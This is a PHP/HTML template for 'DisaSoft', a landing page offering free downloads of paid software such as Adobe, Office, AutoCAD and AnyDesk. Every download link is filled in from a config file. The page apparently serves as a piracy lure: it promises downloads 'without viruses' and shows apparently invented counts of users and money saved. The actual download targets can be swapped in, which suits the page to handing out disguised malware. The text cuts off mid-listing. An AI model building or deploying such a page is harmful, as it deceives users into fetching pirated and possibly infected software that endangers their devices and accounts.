<?
$_config = require_once($_SERVER['DOCUMENT_ROOT'] . '/config.php');
?>

<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DisaSoft — Download free games and cheats for top games for free and without viruses</title>

    <meta property="og:title"
        content="DisaSoft — Download free games and cheats for top games for free and without viruses">
    <meta property="og:description"
        content="🚀 On our site you can download popular games and cheats for free — without viruses, registration and sms.">
    <meta property="og:locale" content="en_US">
    <meta property="og:site_name" content="DisaSoft">
    <meta property="og:image" content="/assets/images/preview.jpg">
    <meta property="og:type" content="website">

    <link rel="preload" href="./assets/uikit.min.js" as="script">
    <link rel="preload" href="./assets/uikit-icons.min.js" as="script">

    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href="./assets/uikit.min.css">

    <script src="./assets/uikit.min.js"></script>
    <script src="./assets/uikit-icons.min.js"></script>
</head>

<body>
    <div class="uk-section-main" id="slider" style="background: rgba(0, 0, 0, 0.7) url(./assets/static/bg.jpg);">
        <header>
            <nav class="uk-visible@m uk-navbar uk-container" data-uk-navbar="">
                <div class="uk-navbar-left">
                    <div class="uk-navbar-item">
                        <a href=""><img src="./assets/images/logo.png" alt="DisaSoft"></a>
                    </div>
                </div>
                <div class="uk-navbar-center">
                    <ul class="uk-navbar-nav">
                        <li><a href="#adobe" data-uk-scroll="">Adobe</a></li>
                        <li><a href="#software" data-uk-scroll="">Software</a></li>
                        <li><a href="#faq" data-uk-scroll="">FAQ</a></li>
                    </ul>
                </div>
                <div class="uk-navbar-right">
                    <div class="uk-navbar-item">
                        <a href="#adobe" class="uk-button uk-button-muted" data-uk-scroll="">The best catalog<span
                                data-uk-icon="icon: chevron-right; ratio: .8" class="uk-icon"><svg width="16"
                                    height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                    <polyline fill="none" stroke="#000" stroke-width="1.03" points="7 4 13 10 7 16">
                                    </polyline>
                                </svg></span></a>
                    </div>
                </div>
            </nav>

            <nav class="uk-hidden@m uk-navbar uk-contaienr" data-uk-navbar="dropbar: true">
                <div class="uk-navbar-left">
                    <ul class="uk-navbar-nav">
                        <li>
                            <a class="uk-navbar-toggle uk-margin-left uk-icon uk-navbar-toggle-icon"
                                data-uk-navbar-toggle-icon="" href="#" aria-haspopup="true" aria-expanded="false"><svg
                                    width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                    <style>
                                        .uk-navbar-toggle-animate svg &gt;

                                        [class*='line-'] {
                                            transition: 0.2s ease-in-out;
                                            transition-property: transform, opacity, ;
                                            transform-origin: center;
                                            opacity: 1;
                                        }

                                        .uk-navbar-toggle svg &gt;

                                        .line-3 {
                                            opacity: 0;
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-3 {
                                            opacity: 1;
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-2 {
                                            transform: rotate(45deg);
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-3 {
                                            transform: rotate(-45deg);
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;
                                        .line-1,
                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-4 {
                                            opacity: 0;
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-1 {
                                            transform: translateY(6px) scaleX(0);
                                        }

                                        .uk-navbar-toggle-animate[aria-expanded="true"] svg &gt;

                                        .line-4 {
                                            transform: translateY(-6px) scaleX(0);
                                        }
                                    </style>
                                    <rect class="line-1" y="3" width="20" height="2"></rect>
                                    <rect class="line-2" y="9" width="20" height="2"></rect>
                                    <rect class="line-3" y="9" width="20" height="2"></rect>
                                    <rect class="line-4" y="15" width="20" height="2"></rect>
                                </svg></a>
                            <div class="uk-navbar-dropdown">
                                <ul class="uk-nav uk-navbar-dropdown-nav">
                                    <li><a href="#adobe" data-uk-scroll="">Adobe</a></li>
                                    <li><a href="#software" data-uk-scroll="">Software</a></li>
                                    <li><a href="#faq" data-uk-scroll="">FAQ</a></li>
                                </ul>
                            </div>
                        </li>
                    </ul>
                </div>
                <div class="uk-navbar-center">
                    <ul class="uk-navbar-nav">
                        <li>
                            <a href=""><img src="./assets/images/logo.png" alt=""></a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>

        <div class="uk-section uk-section-xlarge">
            <div class="uk-container">
                <div class="uk-flex-middle uk-grid-large uk-grid uk-grid-stack" data-uk-grid="">
                    <div
                        class="uk-width-1-1@s uk-width-1-2@m uk-text-center uk-text-left@m uk-position-z-index uk-first-column">
                        <span class="uk-label"><span data-uk-icon="windows" class="uk-icon"><svg width="24" height="24"
                                    viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path
                                        d="M12.2762 4.48603V11.2571H21.2293V3.00244L12.2762 4.48603ZM12.2762 19.5376L21.2293 20.9954V12.7454H12.2762V19.5376ZM2.81445 11.2548H10.3824V4.73213L2.81445 5.98603V11.2548ZM2.81445 18.061L10.3824 19.2938V12.7454H2.81445V18.061Z"
                                        fill="white"></path>
                                </svg></span> Download for free!</span>
                        <h1 class="uk-heading-medium uk-margin-small">DisaSoft</h1>
                        <p>Our service provides users with the opportunity to download all programs that have a paid
                            subscription - for free! Every day we help thousands of people save their money!</p>

                        <a href="#adobe" class="uk-button uk-button-default" data-uk-scroll=""><span
                                data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16" height="16"
                                    viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                    <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10"></polyline>
                                    <rect x="3" y="17" width="13" height="1"></rect>
                                    <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3"></line>
                                </svg></span> Go to catalog</a>
                    </div>
                </div>
            </div>
        </div>

        <div class="uk-position-relative uk-visible@m">
            <div class="uk-position-bottom">
                <svg id="wave" style="transform:rotate(0deg); transition: 0.3s" viewBox="0 0 1440 90" version="1.1"
                    xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <lineargradient id="sw-gradient-0" x1="0" x2="0" y1="1" y2="0">
                            <stop stop-color="rgba(255, 255, 255, 1)" offset="0%"></stop>
                            <stop stop-color="rgba(255, 255, 255, 1)" offset="100%"></stop>
                        </lineargradient>
                    </defs>
                    <path style="transform:translate(0, 0px); opacity:1" fill="url(#sw-gradient-0)"
                        d="M0,40L40,46.7C80,53,160,67,240,66.7C320,67,400,53,480,40C560,27,640,13,720,15C800,17,880,33,960,40C1040,47,1120,43,1200,35C1280,27,1360,13,1440,15C1520,17,1600,33,1680,38.3C1760,43,1840,37,1920,40C2000,43,2080,57,2160,61.7C2240,67,2320,63,2400,66.7C2480,70,2560,80,2640,81.7C2720,83,2800,77,2880,68.3C2960,60,3040,50,3120,53.3C3200,57,3280,73,3360,78.3C3440,83,3520,77,3600,71.7C3680,67,3760,63,3840,63.3C3920,63,4000,67,4080,65C4160,63,4240,57,4320,50C4400,43,4480,37,4560,41.7C4640,47,4720,63,4800,61.7C4880,60,4960,40,5040,40C5120,40,5200,60,5280,58.3C5360,57,5440,33,5520,26.7C5600,20,5680,30,5720,35L5760,40L5760,100L5720,100C5680,100,5600,100,5520,100C5440,100,5360,100,5280,100C5200,100,5120,100,5040,100C4960,100,4880,100,4800,100C4720,100,4640,100,4560,100C4480,100,4400,100,4320,100C4240,100,4160,100,4080,100C4000,100,3920,100,3840,100C3760,100,3680,100,3600,100C3520,100,3440,100,3360,100C3280,100,3200,100,3120,100C3040,100,2960,100,2880,100C2800,100,2720,100,2640,100C2560,100,2480,100,2400,100C2320,100,2240,100,2160,100C2080,100,2000,100,1920,100C1840,100,1760,100,1680,100C1600,100,1520,100,1440,100C1360,100,1280,100,1200,100C1120,100,1040,100,960,100C880,100,800,100,720,100C640,100,560,100,480,100C400,100,320,100,240,100C160,100,80,100,40,100L0,100Z">
                    </path>
                </svg>
            </div>
        </div>
    </div>

    <main>
        <section class="uk-section" id="about">
            <div class="uk-container">
                <div class="uk-card uk-card-large uk-card-secondary uk-card-body uk-position-relative">
                    <div class="uk-position-center-left uk-visible@m">
                        <picture>
                            <source srcset="assets/images/softs.png" type="image/png">
                            <img src="./assets/softs.png" alt="adobe">
                        </picture>
                    </div>
                    <div class="uk-flex-right uk-flex-middle uk-grid-large uk-grid uk-grid-stack" data-uk-grid="">
                        <div class="uk-width-1-1@s uk-width-1-2@m uk-first-column">
                            <h2 class="uk-heading-small">Paid programs for you, for $0</h2>
                            <p>On our site you can find dozens of programs that require a paid subscription, but thanks
                                to our service - you can download them for free!</p>
                            <a href="#adobe" data-uk-scroll=""
                                class="uk-button uk-button-primary uk-width-1-1 uk-width-auto@m">See all apps
                                <span data-uk-icon="icon: more; ratio: .8" class="uk-icon"><svg width="16" height="16"
                                        viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                        <circle cx="3" cy="10" r="2"></circle>
                                        <circle cx="10" cy="10" r="2"></circle>
                                        <circle cx="17" cy="10" r="2"></circle>
                                    </svg></span></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="uk-section">
            <div class="uk-container">
                <div class="uk-flex-center uk-grid-small uk-child-width-1-1@s uk-child-width-1-2@m uk-child-width-1-4@l uk-text-center uk-text-left@m uk-grid"
                    data-uk-grid="">
                    <div class="uk-first-column">
                        <div class="uk-card-small uk-card-secondary uk-card-body">
                            <p class="uk-heading-small uk-margin-remove">50+</p>
                            <p class="uk-margin-remove">Programs Available</p>
                        </div>
                    </div>
                    <div>
                        <div class="uk-card-small uk-card-secondary uk-card-body">
                            <p class="uk-heading-small uk-margin-remove">90K+</p>
                            <p class="uk-margin-remove">Satisfied users</p>
                        </div>
                    </div>
                    <div>
                        <div class="uk-card-small uk-card-secondary uk-card-body">
                            <p class="uk-heading-small uk-margin-remove">770K$+</p>
                            <p class="uk-margin-remove">Saved</p>
                        </div>
                    </div>
                    <div>
                        <div class="uk-card-small uk-card-secondary uk-card-body">
                            <p class="uk-heading-small uk-margin-remove">465K+</p>
                            <p class="uk-margin-remove">Total downloads</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="uk-section" id="adobe">
            <div class="uk-container">
                <h2 class="uk-heading-small">Most popular <img src="./assets/adobe.png" alt="fire" width="64"
                        height="64"></h2>
                <div class="uk-grid-small uk-child-width-1-1@s uk-child-width-1-2@m uk-child-width-1-4@l uk-card-images uk-grid"
                    data-uk-grid="">
                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Photoshop_CC_icon.svg/640px-Adobe_Photoshop_CC_icon.svg.png"
                                    alt="Adobe Photoshop">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Photoshop</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobePhotoshop'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Adobe_Animate_CC_icon_%282020%29.svg/2097px-Adobe_Animate_CC_icon_%282020%29.svg.png">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Animate</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeAnimate'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Adobe_After_Effects_CC_icon.svg/2101px-Adobe_After_Effects_CC_icon.svg.png">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe After Effects</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeAfterEffects'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Adobe_Illustrator_CC_icon.svg/2101px-Adobe_Illustrator_CC_icon.svg.png">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Illustrator</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeIllustrator'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Adobe_Premiere_Pro_CC_icon.svg/2101px-Adobe_Premiere_Pro_CC_icon.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Premiere Pro</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobePremierePro'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/Adobe_Photoshop_Lightroom_CC_logo.svg/246px-Adobe_Photoshop_Lightroom_CC_logo.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Lightroom</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeLightroom'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Adobe_InDesign_CC_icon.svg/2101px-Adobe_InDesign_CC_icon.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe InDesign</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeInDesign'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Adobe_XD_CC_icon.svg/2101px-Adobe_XD_CC_icon.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe XD</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeXD'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Adobe_Audition_CC_icon_%282020%29.svg/2101px-Adobe_Audition_CC_icon_%282020%29.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Auditon</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeAudition'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/2048px-Adobe_Acrobat_DC_logo_2020.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Adobe Acrobat</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AdobeAcrobat'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon">
                                            <svg width="16" height="16" viewBox="0 0 20 20"
                                                xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="uk-section" id="software">
            <div class="uk-container">
                <h2 class="uk-heading-small">Software <img src="./assets/software.png" alt="fire" width="64"
                        height="64"></h2>
                <div class="uk-grid-small uk-child-width-1-1@s uk-child-width-1-2@m uk-child-width-1-4@l uk-card-images uk-grid"
                    data-uk-grid="">
                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Microsoft_Office_logo_%282019%E2%80%93present%29.svg/2048px-Microsoft_Office_logo_%282019%E2%80%93present%29.svg.png">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Microsoft Office</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['MicrosoftOffice'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://www.coreldraw.com/static/cdgs/images/pages/product-info-sheet/key-img.png">
                            </picture>

                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">CorelDRAW</h3>
                                <p class="uk-margin-remove"></p>

                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['CorelDRAW'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://www.uygunlisans.com/wp-content/uploads/2019/08/pngfind.com-winrar-icon-png-4423707-1.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">WinRar</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['WinRar'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Vegas_Pro_15.0.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Sony Vegas Pro</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['VegasPro'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://seeklogo.com/images/A/autocad-logo-C9817CB828-seeklogo.com.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">AutoCAD</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['AutoCAD'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/DaVinci_Resolve_17_logo.svg/2048px-DaVinci_Resolve_17_logo.svg.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">DaVinci Resolve</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['DaVinciResolve'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/43/Sketchup_logo2.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">SketchUp</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['SketchUp'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img
                                    src="https://gdm-catalog-fmapi-prod.imgix.net/ProductLogo/29cdcfa5-a58d-4c2a-8a6f-daa75d1d2d56.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Anydesk</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['SketchUp'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
                                                <line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3">
                                                </line>
                                            </svg></span> Download now</a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="uk-first-column">
                        <div class="uk-card uk-card-small">
                            <picture>
                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/BlueStacks_Logo2.png">
                            </picture>
                            <div class="uk-margin-small">
                                <h3 class="uk-margin-remove">Bluestacks</h3>
                                <p class="uk-margin-remove"></p>
                                <div class="uk-margin-small" onclick="showModal()">
                                    <a href="<?= $_config['Bluestacks'] ?>" target="_blank" class="uk-link"><span
                                            data-uk-icon="icon: download; ratio: .8" class="uk-icon"><svg width="16"
                                                height="16" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                                                <polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10">
                                                </polyline>
                                                <rect x="3" y="17" width="13" height="1"></rect>
